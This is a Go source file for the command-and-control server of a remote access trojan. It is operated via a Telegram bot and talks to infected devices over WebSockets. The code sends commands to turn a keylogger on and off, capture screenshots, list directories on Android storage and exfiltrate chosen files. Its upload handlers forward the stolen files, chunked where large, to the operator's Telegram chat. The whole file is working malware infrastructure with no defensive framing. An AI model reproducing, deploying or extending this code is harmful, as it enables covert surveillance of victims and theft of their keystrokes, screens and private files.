package main

import (
	"bytes"
	"context"
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/go-telegram/bot"
	"github.com/go-telegram/bot/models"
	"github.com/gorilla/websocket"
)

var (
	token     = os.Getenv("TELEGRAM_TOKEN")
	chatIDStr = os.Getenv("CHAT_ID")
	clients   = make(map[*websocket.Conn]string)
	deviceMu  sync.RWMutex
	upgrader  = websocket.Upgrader{CheckOrigin: func(r *http.Request) bool { return true }}
)

var chatID int64
const maxPartSize = 50 * 1024 * 1024 // Telegram limit
const authToken   = "Bearer 1234"     // RAT's auth

func main() {
	var err error
	chatID, err = strconv.ParseInt(chatIDStr, 10, 64)
	if err != nil {
		log.Fatal("Invalid CHAT_ID:", err)
	}

	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	go startBot(ctx)

	http.HandleFunc("/", rootHandler)
	http.HandleFunc("/upload", uploadHandler)     // Screenshots/small files
	http.HandleFunc("/upload_chunked", chunkedHandler) // Chunked/resumable
	http.HandleFunc("/ws", wsHandler)

	port := os.Getenv("PORT")
	if port == "" {
		port = "10000"
	}
	log.Printf("C2 → https://%s.onrender.com", os.Getenv("RENDER_SERVICE_NAME"))
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func startBot(ctx context.Context) {
	b, err := bot.New(token)
	if err != nil {
		log.Fatal("Bot init failed:", err)
	}

	b.RegisterHandler(bot.HandlerTypeMessageText, "", bot.MatchTypePrefix, func(ctx context.Context, b *bot.Bot, update *models.Update) {
		if update.Message == nil || update.Message.Chat.ID != chatID {
			return
		}
		text := strings.ToLower(strings.TrimSpace(update.Message.Text))
		parts := strings.Fields(text)
		if len(parts) == 0 { return }
		cmd := parts[0]
		arg := strings.Join(parts[1:], " ")

		switch cmd {
		case "/start":
			listDevices(b, ctx)
		case "/on":
			broadcastJSON(map[string]any{"command": "ON"})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger ON"})
		case "/off":
			broadcastJSON(map[string]any{"command": "OFF"})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Keylogger OFF"})
		case "/screenshot":
			broadcastJSON(map[string]any{"command": "screenshot"})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Screenshot requested"})
		case "/ls", "/dir":
			path := "/storage/emulated/0"
			if arg != "" { path = arg }
			reqID := genID()
			broadcastJSON(map[string]any{
				"command": "file_list",
				"path":    path,
				"request_id": reqID,
			})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Listing: %s (ID: %s)", path, reqID)})
		case "/download", "/get", "/send_file":
			if arg == "" {
				b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Usage: /download <path>"})
				return
			}
			broadcastJSON(map[string]any{
				"command":   "send_file",
				"file_path": arg,
			})
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Downloading: %s", arg)})
		case "/help":
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: `/start - Devices
/on /off - Keylogger toggle
/screenshot - Capture screen
/ls <path> - List directory
/download <path> - Exfil file
/help - Commands`})
		default:
			b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "Unknown. /help for list."})
		}
	})
	b.Start(ctx)
}

func listDevices(b *bot.Bot, ctx context.Context) {
	deviceMu.RLock()
	defer deviceMu.RUnlock()
	if len(clients) == 0 {
		b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: "No devices connected."})
		return
	}
	var list []string
	for _, name := range clients {
		list = append(list, "• "+name)
	}
	b.SendMessage(ctx, &bot.SendMessageParams{ChatID: chatID, Text: fmt.Sprintf("Devices (%d):\n%s", len(clients), strings.Join(list, "\n"))})
}

func broadcastJSON(data map[string]any) {
	payload, _ := json.Marshal(data)
	deviceMu.RLock()
	defer deviceMu.RUnlock()
	log.Printf("→ %s", string(payload))
	for conn := range clients {
		if err := conn.WriteMessage(websocket.TextMessage, payload); err != nil {
			log.Printf("WS error: %v", err)
			delete(clients, conn)
		}
	}
}

func rootHandler(w http.ResponseWriter, r *http.Request) {
	json.NewEncoder(w).Encode(map[string]any{"status": "running", "devices": len(clients)})
}

func uploadHandler(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("Authorization") != authToken {
		http.Error(w, `{"status":"error","message":"unauthorized"}`, http.StatusUnauthorized)
		return
	}
	if r.Method != "POST" {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	file, header, err := r.FormFile("file")
	if err != nil {
		log.Printf("Upload error: %v", err)
		http.Error(w, `{"status":"error","message":"no file"}`, http.StatusBadRequest)
		return
	}
	defer file.Close()
	data, err := io.ReadAll(file)
	if err != nil {
		log.Printf("Read error: %v", err)
		http.Error(w, `{"status":"error","message":"read fail"}`, http.StatusInternalServerError)
		return
	}
	caption := fmt.Sprintf("Uploaded: %s (%d KB)", header.Filename, len(data)/1024)
	sendFileToTelegram(header.Filename, data, caption)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{"status": "ok", "saved_offset": 0})
}

func chunkedHandler(w http.ResponseWriter, r *http.Request) {
	if r.Header.Get("Authorization") != authToken {
		http.Error(w, `{"status":"error","message":"unauthorized"}`, http.StatusUnauthorized)
		return
	}
	if r.Method != "POST" {
		http.Error(w, "POST only", http.StatusMethodNotAllowed)
		return
	}
	chunkFile, header, err := r.FormFile("file_chunk")
	if err != nil {
		// Fallback to raw body for non-multipart
		defer r.Body.Close()
		bodyData, _ := io.ReadAll(r.Body)
		caption := fmt.Sprintf("Chunked data: %d bytes", len(bodyData))
		sendFileToTelegram("data.bin", bodyData, caption)
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]any{"status": "ok", "saved_offset": 0})
		return
	}
	defer chunkFile.Close()
	chunkData, err := io.ReadAll(chunkFile)
	if err != nil {
		log.Printf("Chunk read error: %v", err)
		http.Error(w, `{"status":"error","message":"read fail"}`, http.StatusInternalServerError)
		return
	}
	offsetStr := r.FormValue("offset")
	totalStr := r.FormValue("total_size")
	chunkIndexStr := r.FormValue("chunk_index")
	requestID := r.FormValue("request_id")
	filename := header.Filename
	if filename == "" {
		filename = "chunk_" + chunkIndexStr
	}
	offset, _ := strconv.ParseInt(offsetStr, 10, 64)
	total, _ := strconv.ParseInt(totalStr, 10, 64)
	caption := fmt.Sprintf("Chunk %s: %s (%d/%d bytes, offset %d)", chunkIndexStr, filename, offset+int64(len(chunkData)), total, offset)
	sendFileToTelegram(filename, chunkData, caption)
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"status":       "ok",
		"saved_offset": offset + int64(len(chunkData)),
		"request_id":   requestID,
	})
}

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Printf("WS upgrade failed: %v", err)
		return
	}
	defer conn.Close()

	// RAT sends device name first
	_, msg, err := conn.ReadMessage()
	if err != nil {
		log.Printf("No device name: %v", err)
		return
	}
	device := strings.TrimSpace(string(msg))
	if !strings.HasPrefix(device, "device:") {
		device = "device: " + device
	}
	deviceName := strings.TrimPrefix(device, "device: ")
	if deviceName == "" {
		deviceName = "Unknown Device"
	}
	log.Printf("RAT connected: %s", deviceName)

	deviceMu.Lock()
	clients[conn] = deviceName
	deviceMu.Unlock()

	defer func() {
		deviceMu.Lock()
		delete(clients, conn)
		deviceMu.Unlock()
		log.Printf("RAT disconnected: %s", deviceName)
	}()

	for {
		_, msg, err := conn.ReadMessage()
		if err != nil {
			log.Printf("WS read error: %v", err)
			break
		}
		text := string(msg)
		log.Printf("RAT → %s: %s", deviceName, text)
		if strings.Contains(text, "file_list_response") || strings.Contains(text, "ls:") {
			// Format directory listings nicely
			sendMsg(fmt.Sprintf("📁 [%s]\n%s", deviceName, text))
		} else if strings.Contains(text, "complete") {
			sendMsg(fmt.Sprintf("✅ [%s] %s", deviceName, text))
		} else {
			sendMsg(fmt.Sprintf("[%s]\n%s", deviceName, text))
		}
	}
}

func sendFileToTelegram(filename string, data []byte, caption string) {
	b, _ := bot.New(token)
	if len(data) == 0 {
		return
	}
	if len(data) <= maxPartSize {
		b.SendDocument(context.Background(), &bot.SendDocumentParams{
			ChatID:   chatID,
			Document: &models.InputFileUpload{Filename: filename, Data: bytes.NewReader(data)},
			Caption:  caption,
		})
		return
	}
	// Split large files
	numParts := int(math.Ceil(float64(len(data)) / float64(maxPartSize)))
	for i := 0; i < numParts; i++ {
		start := i * maxPartSize
		end := start + maxPartSize
		if end > len(data) {
			end = len(data)
		}
		partData := data[start:end]
		partName := fmt.Sprintf("%s.part%d", filename, i+1)
		b.SendDocument(context.Background(), &bot.SendDocumentParams{
			ChatID:   chatID,
			Document: &models.InputFileUpload{Filename: partName, Data: bytes.NewReader(partData)},
			Caption:  fmt.Sprintf("%s\nPart %d/%d (%d KB)", caption, i+1, numParts, len(partData)/1024),
		})
		time.Sleep(200 * time.Millisecond) // Rate limit
	}
}

func sendMsg(text string) {
	b, _ := bot.New(token)
	b.SendMessage(context.Background(), &bot.SendMessageParams{ChatID: chatID, Text: text})
}

func genID() string {
	b := make([]byte, 8)
	rand.Read(b)
	return base64.URLEncoding.EncodeToString(b)[:11]
}